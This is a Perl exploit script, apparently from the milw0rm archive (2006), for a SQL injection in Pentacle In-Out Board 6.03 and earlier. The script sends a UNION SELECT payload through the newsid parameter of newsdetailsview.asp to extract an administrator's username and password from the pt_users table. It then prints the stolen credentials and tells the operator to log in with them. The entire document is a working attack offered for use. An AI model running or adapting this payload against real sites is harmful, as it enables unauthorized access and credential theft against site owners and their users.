#!/usr/bin/perl
#Method found & Exploit scripted by nukedx
#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Usage: penta.pl <victim> <directory>
#Original Advisory: http://www.nukedx.com/?viewdoc=14
use IO::Socket;
if(@ARGV < 3){
print "
+***********************************************************************+
+Pentacle In-Out Board <= 6.03 (newsdetailsview.asp) Remote SQL-Inj. XPL+
+                Usage: penta.pl <victim> <directory> <userid>          +
+                       Example: penta.pl sux.com / 1                   +
+                 Method found & Exploit scripted by nukedx             +
+***********************************************************************+
";
exit();
}
#Local variables
$pentaserver = $ARGV[0];
$pentaserver =~ s/(http:\/\/)//eg;
$pentahost = "http://".$pentaserver;
$port = "80";
$pentadir = $ARGV[1];
$pentaid  = $ARGV[2];
$pentatar = "newsdetailsview.asp?newsid=";
$pentafinal = "login.asp";
$pentaxp = "11%20union%20select%200,userpassword,0,username,0,0,0,0%20from%20pt_users%20where%20userid=".$pentaid."%20and%20useradmin=yes";
$pentareq = $pentahost.$pentadir.$pentatar.$pentaxp;
#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $pentaserver\n";
$penta = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$pentaserver", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $penta "GET $pentareq\n";
print $penta "Host: $pentaserver\n";
print $penta "Accept: */*\n";
print $penta "Connection: close\n\n";
print "+ Connected!...\n";
while($answer = <$penta>) {
if ($answer =~ /class=\"newsdetailtitle\">(.*?)<\/td>/){ 
print "+ Exploit succeed! Getting USERID: $pentaid admin login information.\n";
print "+ ---------------- +\n";
print "+ USERNAME: $1\n";
}
if ($answer =~ /<td align=\"right\" class=\"style9px\">(.*?)&nbsp;/) { 
print "+ PASSWORD: $1\n";
print "+ ---------------- +\n";
print "+ Lets go $pentahost$pentadir$pentafinal and\n+ Login with this information. \n";
print "+**********************************************************************+\n";
exit(); 
}
if ($answer =~ /Internal Server Error/) { 
print "+ This version of Pentacle In-Out Board is vulnerable too but default query of SQL-inject doesnt work on it\n";
print "+ So please edit query by manually adding or removing null datas..\n";
print "+**********************************************************************+\n";
exit(); 
}
if ($answer =~ /number of columns/) { 
print "+ This version of Pentacle In-Out Board is vulnerable too but default query of SQL-inject doesnt work on it\n";
print "+ So please edit query by manually adding or removing null datas..\n";
print "+**********************************************************************+\n";
exit(); 
}
}
print "+ Try another userid maybe this one not the admin.\n";
print "+ Exploit failed :(\n";
print "+**********************************************************************+\n";

# nukedx.com [2006-02-25]

# milw0rm.com [2006-02-25]
